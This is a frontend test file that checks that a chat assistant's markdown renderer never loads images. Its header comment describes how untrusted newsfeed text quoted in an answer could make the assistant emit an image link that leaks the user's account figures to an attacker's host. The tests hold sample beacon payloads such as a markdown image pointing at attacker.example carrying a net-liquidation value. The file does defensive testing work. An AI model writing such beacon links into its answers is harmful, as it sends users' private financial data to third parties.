/**
 * @vitest-environment jsdom
 *
 * F9 (layer 2) — the assistant answer renderer must not fetch remote images.
 *
 * MarkdownRenderer did not override `img`, and react-markdown emits an <img>
 * for any https URL. Combined with an assistant answer that quotes untrusted
 * retrieved text (newsfeed bodies) and a loop that can read portfolio / P&L /
 * journal state, a single `![](https://attacker/?d=<net liq>)` in the answer
 * silently beacons account figures to the attacker's host on render.
 *
 * No legitimate chat answer needs a remote image, so the node renders as inert
 * text instead of loading.
 */
import React from "react";
import { describe, expect, it } from "vitest";
import { render, screen } from "@testing-library/react";

import MarkdownRenderer from "../components/MarkdownRenderer";

describe("MarkdownRenderer — markdown images never load", () => {
  it("renders no <img> element for a remote image", () => {
    const { container } = render(
      <MarkdownRenderer content={"Net liq is $412,000.\n\n![](https://attacker.example/?d=412000)"} />,
    );

    expect(container.querySelectorAll("img")).toHaveLength(0);
    expect(container.innerHTML).not.toContain("attacker.example");
  });

  it("renders no <img> for a same-origin-looking relative image either", () => {
    const { container } = render(<MarkdownRenderer content={"![chart](/reports/x.png)"} />);

    expect(container.querySelectorAll("img")).toHaveLength(0);
  });

  it("keeps the surrounding answer text intact", () => {
    render(
      <MarkdownRenderer content={"Position summary\n\n![beacon](https://attacker.example/p.png)"} />,
    );

    expect(screen.getByText("Position summary")).toBeTruthy();
  });

  it("still renders ordinary links and prose", () => {
    const { container } = render(
      <MarkdownRenderer content={"See [the eval](https://radon.run/eval) for detail."} />,
    );

    const link = container.querySelector("a");
    expect(link?.getAttribute("href")).toBe("https://radon.run/eval");
  });
});
